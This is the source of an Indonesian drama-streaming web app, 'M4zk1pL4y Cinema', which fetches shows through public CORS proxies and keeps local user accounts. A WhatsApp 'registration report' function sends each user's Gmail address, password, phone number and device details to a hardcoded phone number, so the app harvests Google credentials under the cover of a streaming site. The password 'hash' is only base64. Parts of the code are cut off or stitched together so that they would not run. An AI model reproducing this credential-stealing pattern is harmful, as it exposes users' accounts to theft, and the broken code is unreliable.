<!DOCTYPE html>
<html lang="id" data-theme="dark">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>M4zk1pL4y Cinema</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
:root{
  --bg:#07070e; --bg2:#0e0e18; --card:#15151f; --card2:#1c1c28; --line:#26263a;
  --tx:#f5f5fa; --tx2:#9a9ab0; --tx3:#6a6a80;
  --acc:#ff2f6d; --acc2:#8b5cf6; --ok:#22c55e;
  --nav:66px;
  --grad:linear-gradient(135deg,#ff2f6d,#8b5cf6);
  --shade:linear-gradient(to top,#07070e 2%,rgba(7,7,14,.86) 26%,rgba(7,7,14,.15) 62%,rgba(7,7,14,.5) 100%);
}
html[data-theme="light"]{
  --bg:#f6f6fb; --bg2:#ffffff; --card:#ffffff; --card2:#f0f0f7; --line:#e2e2ee;
  --tx:#12121c; --tx2:#5c5c72; --tx3:#8a8aa0;
  --shade:linear-gradient(to top,#f6f6fb 2%,rgba(246,246,251,.9) 26%,rgba(246,246,251,.2) 62%,rgba(0,0,0,.35) 100%);
}
html,body{height:100%}
body{
  background:var(--bg);color:var(--tx);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  overscroll-behavior:none;line-height:1.45;
}
img{display:block;max-width:100%}
button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
input{font:inherit}
.hidden{display:none!important}
::selection{background:var(--acc);color:#fff}
::-webkit-scrollbar{width:0;height:0}

/* SPLASH */
#splash{
  position:fixed;inset:0;z-index:999;display:flex;flex-direction:column;
  align-items:center;justify-content:center;gap:18px;text-align:center;
  padding:calc(env(safe-area-inset-top) + 28px) 26px calc(env(safe-area-inset-bottom) + 28px);
  background:radial-gradient(120% 80% at 50% 0%,#241035 0%,#0b0714 46%,#07070e 100%);
  overflow-y:auto;
}
#splash::before{
  content:"";position:absolute;width:340px;height:340px;border-radius:50%;
  background:var(--grad);filter:blur(90px);opacity:.35;top:-90px;animation:float 7s ease-in-out infinite;
}
@keyframes float{50%{transform:translateY(26px) scale(1.12)}}
.sp-logo{
  width:88px;height:88px;border-radius:26px;background:var(--grad);display:grid;place-items:center;
  font-weight:900;font-size:30px;color:#fff;letter-spacing:-1px;
  box-shadow:0 20px 50px -12px rgba(255,47,109,.7);position:relative;z-index:1;
  animation:pop .6s cubic-bezier(.2,1.4,.4,1) both;
}
@keyframes pop{from{transform:scale(.5) rotate(-14deg);opacity:0}}
.sp-name{
  font-size:clamp(21px,6.4vw,28px);font-weight:900;letter-spacing:-.6px;position:relative;z-index:1;
  background:linear-gradient(100deg,#fff,#ffc9da 45%,#c9b6ff);-webkit-background-clip:text;background-clip:text;
  -webkit-text-fill-color:transparent;animation:up .7s .1s both;
}
.sp-welcome{
  max-width:340px;font-size:clamp(13.5px,3.7vw,15px);color:#cfc9dd;line-height:1.7;
  position:relative;z-index:1;animation:up .7s .18s both;
}
.sp-welcome b{color:#fff}
.sp-by{
  font-size:11.5px;letter-spacing:2.6px;text-transform:uppercase;color:#8d86a3;font-weight:700;
  position:relative;z-index:1;animation:up .7s .26s both;
}
.sp-btn{
  margin-top:8px;position:relative;z-index:1;min-width:210px;padding:15px 30px;border-radius:999px;
  background:var(--grad);color:#fff;font-weight:800;font-size:15px;letter-spacing:.4px;
  box-shadow:0 16px 40px -14px rgba(139,92,246,.9);animation:up .7s .34s both;
  transition:transform .16s,filter .16s;
}
.sp-btn:active{transform:scale(.95);filter:brightness(1.15)}
.sp-note{font-size:11px;color:#6f6885;position:relative;z-index:1;animation:up .7s .42s both}
@keyframes up{from{opacity:0;transform:translateY(16px)}}

/* SHELL */
#app{min-height:100dvh;display:flex;flex-direction:column}
#views{flex:1;position:relative;min-height:0}
.view{display:none;height:100dvh;min-height:560px;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch}
.view.active{display:block}
.view.pad{padding-bottom:calc(var(--nav) + env(safe-area-inset-bottom) + 24px)}

.topbar{
  position:sticky;top:0;z-index:30;display:flex;align-items:center;gap:10px;
  padding:calc(env(safe-area-inset-top) + 10px) 14px 10px;
  background:linear-gradient(to bottom,rgba(7,7,14,.94),rgba(7,7,14,.72) 70%,transparent);
  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
}
html[data-theme="light"] .topbar{background:linear-gradient(to bottom,rgba(246,246,251,.96),rgba(246,246,251,.75) 70%,transparent)}
.brand{display:flex;align-items:center;gap:8px;flex:1;min-width:0}
.brand-mark{
  width:32px;height:32px;border-radius:10px;background:var(--grad);display:grid;place-items:center;
  font-weight:900;font-size:13px;color:#fff;flex:none;box-shadow:0 6px 16px -6px rgba(255,47,109,.9)
}
.brand-txt{font-weight:900;font-size:15px;letter-spacing:-.4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.brand-txt span{background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.icon-btn{
  width:38px;height:38px;border-radius:12px;display:grid;place-items:center;flex:none;
  background:rgba(255,255,255,.07);border:1px solid var(--line);color:var(--tx);
  transition:transform .14s,background .14s;
}
.icon-btn:active{transform:scale(.9);background:rgba(255,255,255,.16)}
html[data-theme="light"] .icon-btn{background:rgba(0,0,0,.04)}
.icon-btn svg{width:19px;height:19px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}

/* FEED */
#v-feed{padding:0;scroll-snap-type:y mandatory;scroll-padding-bottom:var(--nav)}
.feed-card{
  position:relative;height:100dvh;min-height:560px;scroll-snap-align:start;scroll-snap-stop:always;
  display:flex;flex-direction:column;justify-content:flex-end;overflow:hidden;background:var(--card);
}
.fc-img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;background:linear-gradient(160deg,#1b1030,#0b0714)}
.fc-img.err{opacity:0}
.fc-shade{position:absolute;inset:0;background:var(--shade)}
.fc-body{
  position:relative;z-index:2;padding:0 18px calc(var(--nav) + env(safe-area-inset-bottom) + 22px);
  display:flex;flex-direction:column;gap:11px;
}
.fc-badges{display:flex;gap:7px;flex-wrap:wrap}
.badge{
  font-size:11px;font-weight:800;padding:5px 10px;border-radius:999px;letter-spacing:.3px;
  background:rgba(255,255,255,.14);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.18);color:#fff;
}
.badge.hot{background:var(--grad);border-color:transparent}
.badge.dub{background:rgba(34,197,94,.28);border-color:rgba(34,197,94,.5)}
.badge.sub{background:rgba(59,130,246,.28);border-color:rgba(59,130,246,.5)}
.fc-title{font-size:clamp(22px,7vw,30px);font-weight:900;line-height:1.12;letter-spacing:-.8px;text-shadow:0 2px 20px rgba(0,0,0,.6)}
.fc-intro{
  font-size:13px;color:#d3d3e2;line-height:1.55;display:-webkit-box;-webkit-line-clamp:3;
  -webkit-box-orient:vertical;overflow:hidden;text-shadow:0 1px 12px rgba(0,0,0,.7);
}
html[data-theme="light"] .fc-title{color:#fff;text-shadow:0 2px 18px rgba(0,0,0,.8)}
html[data-theme="light"] .fc-intro{color:#e6e6f2}
.fc-row{display:flex;gap:9px;align-items:center;margin-top:2px}
.btn-play{
  flex:1;padding:14px 18px;border-radius:999px;background:var(--grad);color:#fff;font-weight:900;
  font-size:14.5px;display:flex;align-items:center;justify-content:center;gap:8px;
  box-shadow:0 14px 34px -12px rgba(255,47,109,.95);transition:transform .14s;
}
.btn-play:active{transform:scale(.96)}
.btn-play svg{width:17px;height:17px;fill:#fff;stroke:none}
.sq-btn{
  width:48px;height:48px;flex:none;border-radius:50%;display:grid;place-items:center;
  background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.24);color:#fff;
  backdrop-filter:blur(10px);transition:transform .14s,background .14s;
}
.sq-btn:active{transform:scale(.9)}
.sq-btn svg{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.sq-btn.on{background:var(--acc);border-color:transparent}
.sq-btn.on svg{fill:#fff;stroke:#fff}

.cont-card{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:flex-end;
  padding:0 18px calc(var(--nav) + env(safe-area-inset-bottom) + 90px)}
.cont-lbl{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:900;letter-spacing:1.4px;
  text-transform:uppercase;color:#fff;background:var(--grad);padding:6px 12px;border-radius:999px;margin-bottom:12px;width:max-content}
.cont-lbl svg{width:12px;height:12px;fill:#fff;stroke:none}

#contBar{
  position:fixed;left:12px;right:12px;bottom:calc(var(--nav) + env(safe-area-inset-bottom) + 10px);
  z-index:55;display:none;align-items:center;gap:10px;padding:8px 10px 8px 8px;border-radius:16px;
  background:rgba(22,22,34,.92);border:1px solid var(--line);backdrop-filter:blur(18px);
  box-shadow:0 14px 40px -12px #000;
}
html[data-theme="light"] #contBar{background:rgba(255,255,255,.95)}
#contBar.on{display:flex;animation:up .3s both}
#contBar img{width:38px;aspect-ratio:336/478;object-fit:cover;border-radius:9px;flex:none;background:var(--card2)}
#contBar .tx{flex:1;min-width:0}
#contBar b{display:block;font-size:12px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
#contBar small{font-size:10.5px;color:var(--tx3);font-weight:700}
#contBar .pb{height:3px;border-radius:9px;background:var(--line);margin-top:5px;overflow:hidden}
#contBar .pb i{display:block;height:100%;background:var(--grad);border-radius:9px}
#contBar .go{width:36px;height:36px;border-radius:50%;background:var(--grad);display:grid;place-items:center;flex:none}
#contBar .go svg{width:14px;height:14px;fill:#fff;stroke:none;margin-left:2px}

.sec{padding:18px 0 4px}
.sec-hd{display:flex;align-items:baseline;gap:8px;padding:0 16px 11px}
.sec-hd h3{font-size:16px;font-weight:900;letter-spacing:-.3px}
.sec-hd span{font-size:11.5px;color:var(--tx3);font-weight:700}
.sec-hd .lnk{margin-left:auto;font-size:11.5px;font-weight:800;color:var(--acc)}
.rail{display:flex;gap:11px;overflow-x:auto;padding:2px 16px 12px;scroll-snap-type:x proximity}
.rail::-webkit-scrollbar{display:none}

.pcard{flex:none;width:118px;scroll-snap-align:start;text-align:left;position:relative}
.pcard .ph{
  position:relative;width:100%;aspect-ratio:336/478;border-radius:13px;overflow:hidden;
  background:linear-gradient(160deg,#1e1435,#0d0918);border:1px solid var(--line);
}
.pcard .ph img{width:100%;height:100%;object-fit:cover}
.pcard .ph img.err{opacity:0}
.pcard .ep-tag{
  position:absolute;bottom:6px;left:6px;font-size:10px;font-weight:800;color:#fff;
  padding:3px 7px;border-radius:6px;background:rgba(0,0,0,.68);backdrop-filter:blur(6px);
}
.pcard .rk{
  position:absolute;top:0;left:0;min-width:28px;height:28px;padding:0 6px;display:grid;place-items:center;
  font-size:13px;font-weight:900;color:#fff;background:var(--grad);border-bottom-right-radius:10px;
}
.pcard .pbar{position:absolute;left:0;right:0;bottom:0;height:4px;background:rgba(0,0,0,.5)}
.pcard .pbar i{display:block;height:100%;background:var(--acc)}
.pcard .dubb{position:absolute;top:6px;right:6px;font-size:9px;font-weight:900;color:#fff;
  padding:2px 6px;border-radius:5px;background:rgba(34,197,94,.9)}
.pcard h4{
  font-size:12.5px;font-weight:700;margin-top:7px;line-height:1.3;
  display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;
}
.pcard small{font-size:10.5px;color:var(--tx3);font-weight:700}

.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(104px,1fr));gap:14px 11px;padding:4px 16px 20px}
.grid .pcard{width:auto}

.chips{display:flex;gap:8px;overflow-x:auto;padding:4px 16px 12px}
.chip{
  flex:none;padding:9px 15px;border-radius:999px;font-size:12.5px;font-weight:800;
  background:var(--card2);border:1px solid var(--line);color:var(--tx2);white-space:nowrap;
  transition:.14s;
}
.chip:active{transform:scale(.94)}
.chip.on{background:var(--grad);color:#fff;border-color:transparent}
.chip.dub.on{background:linear-gradient(135deg,#22c55e,#0ea5e9)}

.searchbar{
  display:flex;align-items:center;gap:9px;margin:0 16px 12px;padding:0 14px;height:46px;
  background:var(--card2);border:1px solid var(--line);border-radius:14px;
}
.searchbar svg{width:18px;height:18px;stroke:var(--tx3);fill:none;stroke-width:2;flex:none}
.searchbar input{flex:1;min-width:0;background:none;border:0;outline:0;color:var(--tx);font-size:14.5px}
.searchbar input::placeholder{color:var(--tx3)}
.hist-chips{display:flex;flex-wrap:wrap;gap:8px;padding:2px 16px 16px}

.state{padding:56px 30px;text-align:center;color:var(--tx2);display:flex;flex-direction:column;align-items:center;gap:12px}
.state .em{font-size:40px;opacity:.85}
.state h4{font-size:15px;font-weight:800;color:var(--tx)}
.state p{font-size:12.5px;max-width:270px;line-height:1.6}
.state button{padding:11px 22px;border-radius:999px;background:var(--grad);color:#fff;font-weight:800;font-size:13px;margin-top:4px}

.sk{background:linear-gradient(100deg,var(--card) 30%,var(--card2) 50%,var(--card) 70%);background-size:220% 100%;animation:shim 1.25s infinite linear;border-radius:12px}
@keyframes shim{to{background-position:-220% 0}}

#nav{
  position:fixed;left:0;right:0;bottom:0;z-index:60;display:flex;
  height:calc(var(--nav) + env(safe-area-inset-bottom));
  padding-bottom:env(safe-area-inset-bottom);
  background:rgba(9,9,16,.9);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
  border-top:1px solid var(--line);
}
html[data-theme="light"] #nav{background:rgba(255,255,255,.94)}
.nav-item{
  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;
  color:var(--tx3);font-size:10px;font-weight:800;letter-spacing:.2px;transition:color .16s;
}
.nav-item svg{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
.nav-item.on{color:var(--acc)}
.nav-item.on svg{stroke-width:2.3}
.nav-item:active{transform:scale(.93)}

.sheet{
  position:fixed;inset:0;z-index:120;background:var(--bg);display:none;flex-direction:column;
  overflow-y:auto;overscroll-behavior:contain;
}
.sheet.open{display:flex;animation:slideIn .26s cubic-bezier(.3,.9,.3,1)}
@keyframes slideIn{from{transform:translateY(22px);opacity:0}}

.d-hero{position:relative;flex:none;min-height:340px;display:flex;flex-direction:column;justify-content:flex-end;overflow:hidden}
.d-bg{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:blur(2px) brightness(.55);transform:scale(1.06)}
.d-shade{position:absolute;inset:0;background:linear-gradient(to top,var(--bg) 1%,rgba(7,7,14,.82) 40%,rgba(7,7,14,.3) 100%)}
.d-top{position:absolute;top:0;left:0;right:0;display:flex;gap:9px;padding:calc(env(safe-area-inset-top) + 12px) 14px 12px;z-index:3}
.d-top .sp{flex:1}
.d-inner{position:relative;z-index:2;display:flex;gap:14px;padding:16px;align-items:flex-end}
.d-cover{
  width:112px;aspect-ratio:336/478;border-radius:14px;object-fit:cover;flex:none;
  border:2px solid rgba(255,255,255,.2);box-shadow:0 18px 40px -14px #000;background:var(--card)
}
.d-meta{min-width:0;flex:1;padding-bottom:4px}
.d-title{font-size:clamp(19px,5.4vw,24px);font-weight:900;line-height:1.18;letter-spacing:-.5px;margin-bottom:8px}
.d-tags{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:9px}
.d-tags span{font-size:10.5px;font-weight:800;padding:4px 9px;border-radius:7px;background:rgba(255,255,255,.14);color:#fff;backdrop-filter:blur(6px)}
.d-tags span.g{background:rgba(34,197,94,.85)}
.d-tags span.b{background:rgba(59,130,246,.85)}
.d-body{padding:0 16px 32px;display:flex;flex-direction:column;gap:18px}
.d-act{display:flex;gap:9px}
.d-act .btn-play{flex:1}
.d-syn{font-size:13.5px;color:var(--tx2);line-height:1.72}
.d-syn.clamp{display:-webkit-box;-webkit-line-clamp:4;-webkit-box-orient:vertical;overflow:hidden}
.more-btn{align-self:flex-start;font-size:12.5px;font-weight:800;color:var(--acc)}
.blk-hd{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:11px}
.blk-hd h4{font-size:14.5px;font-weight:900}
.blk-hd small{font-size:11.5px;color:var(--tx3);font-weight:700}

.ep-list{display:flex;flex-direction:column;gap:9px}
.ep-row{display:flex;align-items:center;gap:11px;padding:7px;border-radius:13px;
  background:var(--card);border:1px solid var(--line);text-align:left;transition:.14s;position:relative;overflow:hidden}
.ep-row:active{transform:scale(.985);background:var(--card2)}
.ep-th{position:relative;width:86px;aspect-ratio:16/10;border-radius:9px;overflow:hidden;flex:none;background:var(--card2)}
.ep-th img{width:100%;height:100%;object-fit:cover}
.ep-th .num{position:absolute;left:5px;top:5px;font-size:9.5px;font-weight:900;color:#fff;
  padding:2px 6px;border-radius:5px;background:rgba(0,0,0,.72);backdrop-filter:blur(4px)}
.ep-th .dur{position:absolute;right:5px;bottom:5px;font-size:9px;font-weight:800;color:#fff;
  padding:2px 5px;border-radius:4px;background:rgba(0,0,0,.72)}
.ep-th .prog{position:absolute;left:0;right:0;bottom:0;height:3px;background:rgba(0,0,0,.45)}
.ep-th .prog i{display:block;height:100%;background:var(--acc)}
.ep-tx{flex:1;min-width:0}
.ep-tx b{display:block;font-size:13px;font-weight:800}
.ep-tx small{font-size:11px;color:var(--tx3);font-weight:700}
.ep-row.cur{border-color:rgba(255,47,109,.55);background:rgba(255,47,109,.07)}
.ep-row.cur .ep-tx b{color:var(--acc)}
.ep-dl{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;flex:none;
  background:var(--card2);border:1px solid var(--line);color:var(--tx2)}
.ep-dl svg{width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
.ep-dl.done{color:var(--ok);border-color:rgba(34,197,94,.4);background:rgba(34,197,94,.1)}
.ep-dl:active{transform:scale(.9)}

/* PLAYER */
#player{background:#000;overflow:hidden;display:none;flex-direction:column}
#player.open{display:flex}
.p-wrap{position:relative;flex:1;display:grid;place-items:center;min-height:0;background:#000;touch-action:pan-y}
#pvideo{width:100%;max-height:100%;background:#000;display:block}
.p-top{
  position:absolute;top:0;left:0;right:0;z-index:5;display:flex;align-items:center;gap:8px;
  padding:calc(env(safe-area-inset-top) + 10px) 12px 24px;
  background:linear-gradient(to bottom,rgba(0,0,0,.82),transparent);
}
.p-top .t{flex:1;min-width:0;font-size:13px;font-weight:800;color:#fff;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.p-top .icon-btn{background:rgba(255,255,255,.16);border-color:rgba(255,255,255,.2);color:#fff;width:34px;height:34px}
.p-center{position:absolute;inset:0;display:grid;place-items:center;z-index:4;pointer-events:none}
.p-big{
  width:70px;height:70px;border-radius:50%;background:rgba(255,255,255,.18);backdrop-filter:blur(10px);
  border:1px solid rgba(255,255,255,.3);display:grid;place-items:center;pointer-events:auto;color:#fff;
  transition:transform .14s,opacity .2s;
}
.p-big svg{width:30px;height:30px;fill:#fff;stroke:none;margin-left:3px}
.p-big:active{transform:scale(.9)}
.p-big.hide{opacity:0;pointer-events:none}

#pSub{
  position:absolute;left:0;right:0;bottom:104px;z-index:6;padding:0 14px;text-align:center;
  pointer-events:none;display:none;
}
#pSub.on{display:block}
#pSub span{
  display:inline-block;background:rgba(0,0,0,.74);color:#fff;font-size:14px;font-weight:700;

<script>
(function(){
"use strict";

const API  = "https://melolo.goodbos.online/api";
const CODE = "947C4EDB6F923EAC1F55A8B5A73B3B65";
const WA_NUM = "6285262965282";
const K_USERS = "mz_users", K_SESS = "mz_session";
const VPROXY = ["https://api.allorigins.win/raw?url=", "https://api.codetabs.com/v1/proxy?quest="];

const $  = (s,r)=> (r||document).querySelector(s);
const $$ = (s,r)=> Array.from((r||document).querySelectorAll(s));

const S = {
  view:"feed", theme:"dark", autoplay:true, quality:"auto", showCont:true, dubOnly:false,
  lang:"id", user:null, feedOffset:0, feedLoading:false, feedDone:false,
  favs:[], hist:[], dls:[], sHist:[], searchTimer:null, progressTimer:0, pool:[]
};

const uk = ()=> "mz_" + (S.user ? S.user.u : "g") + "_";
const K  = n => uk() + n;

function loadUserData(){
  const g = (n,d)=>{ try{ return JSON.parse(localStorage.getItem(K(n)) || JSON.stringify(d)); }catch(e){ return d; } };
  S.favs = g("fav", []) || []; S.hist = g("hist", []) || [];
  S.dls  = g("dl", [])  || []; S.sHist = g("sh", [])  || [];
  const st = g("set", {});
  if(st.theme) S.theme = st.theme;
  if(typeof st.autoplay === "boolean") S.autoplay = st.autoplay;
  if(st.quality) S.quality = st.quality;
  if(typeof st.showCont === "boolean") S.showCont = st.showCont;
  if(typeof st.dubOnly === "boolean") S.dubOnly = st.dubOnly;
  if(st.lang) S.lang = st.lang;
  document.documentElement.dataset.theme = S.theme;
}
function saveSet(){
  localStorage.setItem(K("set"), JSON.stringify({theme:S.theme,autoplay:S.autoplay,quality:S.quality,showCont:S.showCont,dubOnly:S.dubOnly,lang:S.lang}));
}
const saveFav  = ()=> localStorage.setItem(K("fav"),  JSON.stringify(S.favs.slice(0,400)));
const saveHist = ()=> localStorage.setItem(K("hist"), JSON.stringify(S.hist.slice(0,150)));
const saveDl   = ()=> localStorage.setItem(K("dl"),   JSON.stringify(S.dls.slice(0,200)));
const saveSh   = ()=> localStorage.setItem(K("sh"),   JSON.stringify(S.sHist.slice(0,12)));

/* ---------- akun ---------- */
function getUsers(){ try{ return JSON.parse(localStorage.getItem(K_USERS) || "[]"); }catch(e){ return []; } }
function putUsers(u){ localStorage.setItem(K_USERS, JSON.stringify(u)); }
const hash = s => btoa(unescape(encodeURIComponent("mz$" + s)));

function restoreSession(){
  const id = localStorage.getItem(K_SESS);
  if(!id) return;
  const u = getUsers().find(x=> x.u === id);
  if(u) S.user = u;
}
function doRegister(email, pass, name, wa, av){
  const mail = (email||"").trim().toLowerCase();
  if(!/^[a-z0-9._%+\-]+@(gmail|googlemail)\.com$/.test(mail)) return "Masukkan alamat Gmail yang valid";
  if((pass||"").length < 6) return "Password minimal 6 karakter";
  const users = getUsers();
  if(users.some(x=> x.u === mail)) return "Gmail ini sudah terdaftar, silakan masuk";
  const u = {u:mail, p:hash(pass), n:(name||"").trim() || mail.split("@")[0], wa:(wa||"").trim(), av:av||"🎬", c:Date.now()};
  users.push(u); putUsers(users);
  S.user = u; localStorage.setItem(K_SESS, mail);
  loadUserData();
  return null;
}
function doLogin(email, pass){
  const mail = (email||"").trim().toLowerCase();
  const users = getUsers();
  const ex = users.find(x=> x.u === mail);
  if(!ex || ex.p !== hash(pass)) return "Gmail atau password salah";
  S.user = ex; localStorage.setItem(K_SESS, mail);
  loadUserData();
  return null;
}
function logout(){
  localStorage.removeItem(K_SESS);
  S.user = null;
  S.favs = []; S.hist = []; S.dls = []; S.sHist = [];
  loadUserData();
}

/* ---------- kirim ke WhatsApp (otomatis) ---------- */
function buildWaText(u){
  const dev = navigator.userAgent.replace(/\(.*?\)/g,"").trim().slice(0,60);
  return "*PENDAFTARAN BARU — M4zk1pL4y Cinema*\n" +
    "━━━━━━━━━━━━━━\n" +
    "Nama: " + (u.n || "-") + "\n" +
    "Gmail: " + u.u + "\n" +
    "Password: " + (u.pw || "-") + "\n" +
    "No. WhatsApp: " + (u.wa || "-") + "\n" +
    "Waktu: " + new Date().toLocaleString("id-ID") + "\n" +
    "Perangkat: " + dev + "\n" +
    "━━━━━━━━━━━━━━\n" +
    "Total akun terdaftar: " + getUsers().length;
}
function waUrl(u){ return "https://wa.me/" + WA_NUM + "?text=" + encodeURIComponent(buildWaText(u)); }

function kirimWa(u, popup){
  const url = waUrl(u);
  localStorage.setItem("mz_lastreport", url);
  if(popup !== false){
    const w = window.open(url, "_blank");
    return !!w;
  }
  return true;
}

/* ---------- util ---------- */
const esc = s => String(s==null?"":s).replace(/[&<>"']/g, c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
function toast(msg){
  const t = $("#toast"); t.textContent = msg; t.classList.add("on");
  clearTimeout(t._t); t._t = setTimeout(()=> t.classList.remove("on"), 2200);
}
const fmtDur = s => { s = Math.max(0, Math.floor(s||0)); return Math.floor(s/60) + ":" + String(s%60).padStart(2,"0"); };
const isDub = n => /\(dub\)/i.test(n || "");

/* ---------- API ---------- */
const PROXIES = [
  u => u,
  u => "https://corsproxy.io/?" + encodeURIComponent(u),
  u => "https://api.allorigins.win/raw?url=" + encodeURIComponent(u),
  u => "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(u)
];
const withTimeout = (p,ms)=> Promise.race([p, new Promise((_,r)=> setTimeout(()=> r(new Error("timeout")), ms))]);

async function api(path, params){
  const qs = params ? "?" + new URLSearchParams(params).toString() : "";
  const url = API + path + qs;
  let last = null;
  for(const p of PROXIES){
    try{
      const r = await withTimeout(fetch(p(url), {headers:{"Accept":"application/json"}}), 11000);
      if(!r.ok) throw new Error("http " + r.status);
      const j = JSON.parse(await r.text());
      if(j && (j.code === 0 || j.code === 200)) return j;
      throw new Error("api " + (j && j.code));
    }catch(e){ last = e; }
  }
  throw last || new Error("network");
}

const getHome   = off => api("/home", {lang:S.lang, offset:off, code:CODE});
const getDetail = id  => api("/detail/" + encodeURIComponent(id), {lang:S.lang, code:CODE});
const getSearch = q   => api("/search", {lang:S.lang, q:q});
/* PENTING: id = ID DRAMA (bukan vid). Ini yang bikin video tidak gagal. */
const getVideo  = (dramaId, ep) => api("/video", {id:dramaId, ep:ep, code:CODE});

/* ---------- router ---------- */
function go(view){
  if(!["search","hist","dl"].includes(view)){
    $$(".nav-item").forEach(b=> b.classList.toggle("on", b.dataset.nav === view));
  }
  $$(".view").forEach(v=> v.classList.remove("active"));
  const el = $("#v-" + view);
  if(el){ el.classList.add("active"); el.scrollTop = 0; }
  S.view = view;
  updateContBar();
  if(view === "fav")  renderFavs();
  if(view === "hist") renderHist();
  if(view === "me")   renderMe();
  if(view === "dl")   renderDls();
  if(view === "explore" && !$("#exploreBody").dataset.init) initExplore();
}

/* ---------- feed ---------- */
function feedSkeleton(n){
  for(let i=0;i<n;i++){
    const d = document.createElement("article");
    d.className = "feed-card";
    d.innerHTML = '<div class="fc-body"><div class="sk" style="height:20px;width:40%"></div>' +
      '<div class="sk" style="height:26px;width:80%"></div><div class="sk" style="height:14px;width:92%"></div>' +
      '<div class="sk" style="height:48px;border-radius:99px;margin-top:6px"></div></div>';
    $("#feedList").appendChild(d);
  }
}
const clearSkel = ()=> $$("#feedList .feed-card").forEach(c=>{ if(!c.dataset.id) c.remove(); });

async function loadFeed(reset){
  if(S.feedLoading) return;
  if(!reset && S.feedDone) return;
  S.feedLoading = true;
  if(reset){ S.feedOffset = 0; S.feedDone = false; S.pool = []; $("#feedList").innerHTML = ""; feedSkeleton(2); }
  try{
    const j = await getHome(S.feedOffset);
    clearSkel();
    let items = j.data || [];
    if(S.dubOnly) items = items.filter(x=> isDub(x.name));
    if(!items.length) S.feedDone = true;
    items.forEach((it,i)=>{ S.pool.push(it); $("#feedList").appendChild(feedCard(it, S.feedOffset + i)); });
    S.feedOffset += (j.data || []).length;
    if((j.data||[]).length < 6) S.feedDone = true;
    if(!$("#feedList").children.length) emptyFeed();
    if(reset) injectContinueCard();
  }catch(e){
    clearSkel();
    if(!$("#feedList").children.length) emptyFeed();
    else toast("Gagal memuat lebih banyak");
  }
  S.feedLoading = false;
  updateContBar();
}
function emptyFeed(){
  $("#feedList").innerHTML = '<div class="feed-card"><div class="fc-body" style="padding-bottom:120px">' +
    '<div class="state"><div class="em">📡</div><h4>Tidak bisa memuat</h4>' +
    '<p>Periksa koneksi internet kamu lalu coba lagi.</p><button onclick="location.reload()">Muat Ulang</button></div></div></div>';
}

function injectContinueCard(){
  $$("#feedList .feed-card.cont").forEach(c=> c.remove());
  if(!S.showCont || !S.hist.length) return;
  const h = S.hist[0];
  const card = document.createElement("article");
  card.className = "feed-card cont";
  card.dataset.id = h.id;

    '<img class="fc-img" alt="" src="' + esc(h.cover) + '" onerror="this.classList.add(\'err\')">' +
    '<div class="fc-shade"></div><div class="cont-card">' +
      '<span class="cont-lbl"><svg viewBox="0 0 24 24"><path d="M6 4l14 8-14 8z"/></svg> Lanjutkan Menonton</span>' +
      '<h2 class="fc-title">' + esc(h.name) + '</h2>' +
      '<p class="fc-intro">Kamu berhenti di Episode ' + h.ep + ' — ' + (h.pct||0) + '% selesai.</p>' +
      '<div style="height:4px;border-radius:9px;background:rgba(255,255,255,.2);margin:4px 0 14px;overflow:hidden">' +
        '<i style="display:block;height:100%;width:' + (h.pct||0) + '%;background:var(--grad);border-radius:9px"></i></div>' +
      '<div class="fc-row"><button class="btn-play" data-act="resume">' +
        '<svg viewBox="0 0 24 24"><path d="M6 4l14 8-14 8z"/></svg> Lanjutkan Ep ' + h.ep + '</button>' +

function feedCard(it, idx){
  const d = document.createElement("article");
  d.className = "feed-card"; d.dataset.id = it.id;
  const isFav = S.favs.some(f=> f.id === it.id);
  d.innerHTML =
    '<img class="fc-img" loading="lazy" alt="" src="' + esc(it.cover) + '" onerror="this.classList.add(\'err\')">' +
    '<div class="fc-shade"></div><div class="fc-body">' +
      '<div class="fc-badges">' +
        (idx < 3 ? '<span class="badge hot">🔥 Trending</span>' : '') +
        (isDub(it.name) ? '<span class="badge dub">🔊 Audio Indonesia</span>' : '<span class="badge sub">Sub Indonesia</span>') +
        '<span class="badge">' + (it.episodes||0) + ' Episode</span>' +
      '</div>' +
      '<h2 class="fc-title">' + esc(it.name) + '</h2>' +
      '<p class="fc-intro">' + esc(it.intro) + '</p>' +

        '<button class="sq-btn" data-act="share"><svg viewBox="0 0 24 24"><path d="M12 16V4M8 8l4-4 4 4"/><path d="M4 14v5a1 1 0 001 1h14a1 1 0 001-1v-5"/></svg></button>' +

function updateContBar(){
  const bar = $("#contBar"), h = S.hist[0];
  const show = S.showCont && h && S.view === "feed" && !$("#detail").classList.contains("open")
